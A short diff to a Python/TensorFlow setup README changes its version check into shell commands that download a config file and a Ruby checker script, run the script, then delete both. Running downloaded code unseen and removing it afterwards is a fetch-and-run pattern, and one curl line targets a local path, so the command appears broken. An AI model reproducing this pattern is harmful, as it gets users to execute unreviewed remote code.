@@ -620,9 +620,11 @@ pip install -U tensorflow-macos tensorflow-metal
 
 ### Python setup check up
 
-Check your Python version with the following command:
+Check your Python version with the following commands:
 ```bash
-ruby checks/python_checker.rb
+curl <CONFIG_URL> > config.rb
+mkdir checks
+curl checks/python_checker.rb > checks/python_checker.rb && ruby checks/python_checker.rb && rm config.rb && rm -rf checks
 ```
 
 Run the following command to check if you successfully installed the required packages:
